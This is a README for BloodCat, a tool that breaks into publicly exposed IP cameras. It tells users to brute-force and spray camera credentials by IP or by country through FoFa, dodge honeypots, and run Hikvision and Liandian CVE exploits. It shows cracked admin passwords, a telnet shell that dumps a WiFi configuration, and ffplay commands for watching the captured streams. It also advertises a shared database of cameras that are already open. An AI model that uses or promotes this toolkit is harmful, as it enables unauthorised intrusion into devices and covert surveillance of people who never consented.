
# INFO

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

🐈‍⬛ Have you ever wondered whether there are publicly accessible cameras watching the streets you walk every day?
Once you become aware of their existence, you may realize how close and real online exposure actually is.

🤦‍♂️ Are you still struggling with the lack of practical tools for exploiting IP camera vulnerabilities?

🌏 BloodCat officially provides over 300+ publicly accessible IP camera examples worldwide.

🎥 A comprehensive IP Camera penetration testing toolkit, featuring default credential enumeration, CVE exploitation, and additional capabilities — with support for collaborative team usage.

🛡️ BloodCat does not collect any identity-related information.
To ensure user anonymity and security, automatic updates are intentionally disabled to reduce the risk of supply-chain compromise.

💻 BloodCat is compatible with Windows, Linux, and macOS.
On Android, GUI-related components may not function properly; however, the core functionality remains operational.

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

# Blood-Cat

 
<img src="./pic/main2.png" width="100%">

A tool for hacking into publicly exposed network cameras, with support for specifying country and region.

PS: This tool supports weak‑credential and brute‑force testing against most mainstream network camera models. However, some devices with enhanced security mechanisms deliberately obfuscate or conceal their fingerprinting characteristics, which means the tool is not universally effective. Future updates will progressively introduce additional camera‑related CVE‑based vulnerability detection plugins, aiming to improve success rates while reducing unnecessary probing traffic.

---


 

 
 
<img src="./pic/m1.gif" width="100%">
 
<img src="./pic/m2.gif" width="100%">
 

<img src="./pic/m3.gif" width="100%">
 
<img src="./pic/m4.gif" width="100%">
 
<img src="./pic/H4CK13.png" width="100%">
 
---

# Bloodcat Index

- [Video](#official-video)
- [Install](#bloodcat-installation)
- [How use Bloodcat](#bloodcat)
- [How use Bloodcat CVE](#bloodcat-cve)
- [How use Bloodcat Global Map](#bloodcat-map)
- [How use Bloodcat Lan Map](#bloodcat-lan-map)
- [How use Bloodcat Nmap (Run immediately)](#bloodcat-nmap)
- [How use Bloodcat Hikvision Editor](#bloodcat-hikvision-editor)
---


# Official Video

<a href="https://www.youtube.com/watch?v=GuDtAhKAi5M">
  <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DGuDtAhKAi5M" width="100%">
</a>

<a href="https://www.youtube.com/watch?v=q4WR4QpiIwI">
  <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dq4WR4QpiIwI" width="32%">
</a>
<a href="https://www.youtube.com/watch?v=BaA30uFkXbc">
  <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DBaA30uFkXbc" width="32%">
</a>
<a href="https://www.youtube.com/watch?v=_HDXlHj8HlQ">
  <img src="https://markdown-videos-api.jorgenkh.no/url?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D_HDXlHj8HlQ" width="32%">
</a>
 
---

# Other Video

<div align="center">
  <h2>@Root Academy</h2>
<a href="https://www.facebook.com/reel/1675427523211120">
  <img src="https://scontent.xx.fbcdn.net/v/t15.5256-10/610815504_1211463333667661_5197582656440288673_n.jpg?stp=dst-jpg_p960x960_tt6&_nc_cat=108&ccb=1-7&_nc_sid=5fad0e&_nc_ohc=wVpSYtl-_hwQ7kNvwFZWrSu&_nc_oc=Adn4xrkXFvYCD9HRaYH7wndl-fejeHiC3Rz0_WeBIjb3T8UaBAZxG4I_rkXwqOpex9w&_nc_zt=23&_nc_ht=scontent.xx&_nc_gid=69doGrNW1ePhQieHvKuU7Q&oh=00_Aft50j9te0KL3T0xZg4B1OrjAhEPfcFPXHfvoLKQni7dZQ&oe=69911C71" width="100%">
</a>
</div>



---

# Bloodcat Installation

Disk space requirement: `Available space > 600 MB`

```bash
$ sudo apt update && sudo apt install ffmpeg python3-pyqt5.qtwebengine -y
$ git clone https://github.com/MartinxMax/BloodCat.git
$ cd BloodCat && python3 -m venv bloodcat
$ source ./bloodcat/bin/activate
(bloodcat)$ python -m pip install --upgrade pip
(bloodcat)$ pip install opencv-python aiohappyeyeballs aiohttp aiosignal async-timeout attrs certifi charset-normalizer frozenlist geoip2 idna maxminddb multidict propcache pycryptodome PyQt5 PyQt5-Qt5 PyQt5_sip PyQtWebEngine PyQtWebEngine-Qt5 requests typing_extensions urllib3 yarl
``` 

If you are using the Windows operating system, please download `https://github.com/MartinxMax/BloodCat/releases/download/play/ffplay.exe` and move the downloaded .exe file into the `./lib/` directory.


---

# Bloodcat

**About:**
1. Integrates with search engines, enabling target filtering and continuous scanning operations by country, region, or city.
2. Operates at the **RTP protocol**, providing high stealth and efficiency.
3. Performs **camera fingerprint identification** first, automatically filtering out and excluding **honeypot systems**, then enumerates **usernames and passwords** of target network cameras.
4. Supports **password spraying**, applicable to **single IPs or multiple IP ranges**. 
5. Supports **bc data updating and merging**, facilitating long-term maintenance and management.
6. Supports writing **Hikvision camera credential header information** into **bc files**, which can be **visualized on a map**.


**Scanner I recommend: [https://github.com/MartinxMax/n1ght0wl.git](https://github.com/MartinxMax/n1ght0wl.git)**


**After BloodCat successfully gains access to a camera, it will provide you with a playback link.
However, you don’t need to open the link manually.**

**Simply reload the module in BloodCat-Map, then use the IP search in the top-right corner to locate the target.
Click the target, and the video will play directly.**

```bash
(bloodcat)$ python3 bloodcat.py -h
```

![alt text](./pic/image.png)


## Bruteforce a specific camera IP



```bash
(bloodcat)$ python3 bloodcat.py --ip "188.134.80.244:554"
```

![alt text](./pic/image-1.png)

```bash
(bloodcat)$ python3 bloodcat_map.py
```

![alt text](./pic/image-3.png)

 
## Bruteforce for  IP list


```bash
(bloodcat)$ python3 bloodcat.py --ips target.txt
```

![alt text](./pic/image-4.png)

```bash
(bloodcat)$ python3 bloodcat_map.py
```


![alt text](./pic/image-5.png)


## Bruteforce camera IPs in a specific country/region (via FoFa)


```bash
(bloodcat)$ python3 bloodcat.py --country CN --region HK --key <FOFA-API-KEY>
```

![alt text](./pic/image-14.png)


## Merge .bc Data

Place all `.bc` files that need to be merged into the `./data/` directory.

![alt text](./pic/image-12.png)

```bash
(bloodcat)$ python3 bloodcat.py --merge
```


![alt text](./pic/image-13.png)

After execution,
`./data/20260108_171450.bc` will be a deduplicated and merged .bc file.

Replace the original global.bc file, then right-click Reload in BloodCat_Map:

```bash
(bloodcat)$ mv ./data/20260108_171450.bc ./data/global.bc
```

![alt text](./pic/image-15.png)

 
---

# Bloodcat CVE

```bash
(bloodcat)$ python3 bloodcat_cve.py
```
 
![alt text](./pic/cve-image.png)

```bash
Bloodcat@exp# show
```

```
Matching Modules
==============================================================================
ID   Name                           Description
------------------------------------------------------------------------------
1    hikvision/cve-2017-7921        Hikvision auth bypass
2    liandian/cve-2025-7503         Liandian IP Camera Telnet Hardcoded Credentials & Plaintext WiFi Credentials Leak
```

## Hikvision Crack && iVMS-4200 

iVMS-4200 download link : https://github.com/MartinxMax/BloodCat/releases/tag/play



```bash
Bloodcat@exp# use 1
Bloodcat@(CVE-2017-7921)# show
```

```
Parameter       | Value    | Description
----------------------------------------------------------------------
ips            |         | Hosts file (<IP>:<Port>)
threads        | 10      | Thread count
output_type    | json    | json / csv
output_path    | ./result.json| Output file
```

```bash
Bloodcat@(CVE-2017-7921)# set ips /home/maptnh/Desktop/2/bloodcat/BloodCat/tar.txt
Bloodcat@(CVE-2017-7921)# run
```

```
Bloodcat@(CVE-2017-7921)# run
[*] Successfully read 3 valid targets
[*] Start cracking (3 targets, threads=10)
[+] Crack success X.X.X.X:80 => admin:dddddd
[!] 1.59.71.189:80 Request timeout (> 3 seconds)
[+] Crack success X.X.X.X:80 => admin:xxxxx
[*] Start scanning SDK ports (Range: 8000-8100)...
[SDK Crack Success] X.X.X.X:8000
[SDK Crack Success] X.X.X.X:8000
[*] JSON exported successfully: ./result.json (Size: 362 bytes, Number of devices: 2)
[*] Done! Exported 2 devices in total
```

## Liandian IP Camera


```bash
Bloodcat@exp# use 2
Bloodcat@(CVE-2025-7503)# show
```

```BASH
Parameter       | Value    | Description
----------------------------------------------------------------------
ip             |         | ip address
port           | 23      | telnet port
timeout        | 10      | timeout
```

```BASH
Bloodcat@(CVE-2025-7503)# set ip X.X.X.X
Bloodcat@(CVE-2025-7503)# run
```

```BASH
[+] Sending payload to X.X.X.X:23 ...

    _ (`-.   (`\ .-') /`     .-') _   ('-.  _ .-') _   
    ( (OO  )   `.( OO ),'    ( OO ) )_(  OO)( (  OO) )  
    _.`     \,--./  .--.  ,--./ ,--,'(,------.\     .'_  
    (__...--''|      |  |  |   \ |  |\ |  .---',`'--..._) 
    |  /  | ||  |   |  |, |    \|  | )|  |    |  |  \  ' 
    |  |_.' ||  |.'.|  |_)|  .     |/(|  '--. |  |   ' | 
    |  .___.'|         |  |  |\    |  |  .--' |  |   / : 
    |  |     |   ,'.   |  |  | \   |  |  `---.|  '--'  / 
    `--'     '--'   '--'  `--'  `--'  `------'`-------'  
cat /tmp/wificonf/wpa_supplicant.conf
ctrl_interface=/var/run/wpa_supplicant
update_config=1

V380-linux# whoami
whoami
ls -la
-sh: whoami: not found
V380-linux# ls -la
drwxr-xr-x   19 1000     root           218 Jan  8  2022 .
drwxr-xr-x   19 1000     root           218 Jan  8  2022 ..
drwxr-xr-x    2 1000     root           813 Feb 15  2022 bin
drwxrwxrwt    4 root     root          2680 Jan  1  1970 dev
drwxr-xr-x    7 1000     root           350 Feb 12  2022 etc
drwxr-xr-x    3 1000     root            30 Jan 13  2022 ext
drwxr-xr-x    2 1000     root             3 Sep  9  2011 home
lrwxrwxrwx    1 root     root             9 Jan  8  2022 init -> sbin/init
drwxr-xr-x    3 1000     root           773 Jan  7  2022 lib
drwxr-xr-x    5 1000     root            52 Jan  4  2022 mnt
drwxr-xr-x    7 1000     1000            83 Aug 18  2022 mvs
drwxr-xr-x    2 1000     root             3 Oct 17  2011 opt
dr-xr-xr-x   62 root     root             0 Jan  1  1970 proc
drwxr-xr-x    2 1000     root             3 Sep  9  2011 root
drwxr-xr-x    2 1000     root           433 Jan 21  2022 sbin
drwxr-xr-x    2 1000     root             3 Sep  9  2011 srv
dr-xr-xr-x   11 root     root             0 Jan  1  1970 sys
drwxrwxrwt    3 root     root           140 Feb  7 13:49 tmp
drwxr-xr-x    6 1000     root            65 Jan 18  2022 usr
drwxrwxrwt    6 root     root  	         120 Jan  1  1970 var
```

---


# Bloodcat Map


```bash
(bloodcat)$ python3 bloodcat_map.py
```

 
![alt text](./pic/image-2.png)



## Remote API Data

By entering a remote data URL(BloodCat Map API), you can load external datasets.

You may test using the official BloodCat database:

`https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc`

PS: For your own anonymity, do not import or use untrusted BloodCat Map API endpoints, as they may collect your IP address (unless you are using a proxy).

![alt text](./pic/image-6.png)


You can also copy API database links from other BloodCat-Map instances:

![alt text](./pic/image-10.png)

The target data will be loaded and displayed on the map.
If you need to remove an entry, click the X on the right side.
Remote-loaded raw data is not automatically saved locally,
but the remote URL will be written into the configuration file.

![alt text](./pic/image-11.png)

## IP Tracking


You can enter keywords here to perform fuzzy matching on targets.
This allows you to quickly lock and track specific targets on the map.

![alt text](./pic/image-7.png)

## Team Collaboration

To use the chat feature, all team members must:
· Be on the same local network (LAN)
· Run BloodCat-Map simultaneously

The good news is:
· No need to enter peer IP addresses
· No need to worry about sniffing attacks
· Chat packets are encrypted

TEAM A:
![alt text](./pic/image-8.png)
TEAM B:
![alt text](./pic/image-9.png)
 
---


# BloodCat Nmap

PS: This Nmap version only supports detecting anonymous public cameras and cannot brute‑force camera account passwords.
The good news is that you don’t need to install most of BloodCat’s core dependencies to perform the detection.

`$ sudo apt install nmap ffmpeg -y`

`$ wget https://raw.githubusercontent.com/MartinxMax/BloodCat/refs/heads/main/bloodcat.nse -O bloodcat.nse`

`$ nmap --script ./bloodcat.nse -Pn -p 554 X.X.X.X`

![alt text](./pic/nmap2.png)
 
`$ nmap --script ./bloodcat.nse -Pn -p 554 -iL targets.txt`

![alt text](./pic/nmap1.png)

`$ ffplay -fs -rtsp_transport tcp rtsp://admin:123456@x.x.x.x:554/1`

![alt text](./pic/nmap3.png)

---

 
# Bloodcat Hikvision Editor

After importing a CSV configuration file, you can:
1.Filter targets by specific country/region
2.Perform fuzzy matching on fields (e.g. country, keyword, etc.)
3.Re-export only the matched/selected targets
4.Visualize all target cameras directly on a world map using geolocation data

```bash
(bloodcat)$ python3 bloodcat_hikvision_editor.py
```

![alt text](./pic/hik-image.png)

Click Import CSV configuration file.

![alt text](./pic/hik-image-1.png)

View the geographic locations of all Hikvision cameras on the map.

![alt text](./pic/hik-image-2.png)

For example, searching “Japan” in the country field will display all related entries.
All matched items can be auto-selected, then export only the checked targets.

![alt text](./pic/hik-image-3.png)

Finally, use iVMS-4200 to play the exported devices.

Download link : https://github.com/MartinxMax/BloodCat/releases/tag/play

![alt text](./pic/hik-image-4.png)

---

# Bloodcat Lan Map

This is a internal network camera viewer

Test file:
`https://github.com/MartinxMax/BloodCat/releases/download/play/BloodCat_Map_LAN_Test.zip`

```bash
(192.168.0.102)$ unzip BloodCat_Map_LAN_Test.zip
(192.168.0.102)$ cd BloodCat_Map_LAN_Test
(192.168.0.102)$ bash lunch.sh
(192.168.0.107)$ unzip BloodCat_Map_LAN_Test.zip
(192.168.0.107)$ cd BloodCat_Map_LAN_Test
(192.168.0.107)$ bash lunch.sh
```


```bash
# target.txt
192.168.0.107:8554
192.168.0.102:8554
```

```bash
$ python3 bloodcat.py --ips target.txt
```


![alt text](./pic/bloodcat_map_lan.png)

```bash
$ python3 bloodcat_map_lan.py
```

![alt text](./pic/bloodcat_map_lan-1.png)

![alt text](./pic/bloodcat_map_lan-2.png)

---


 







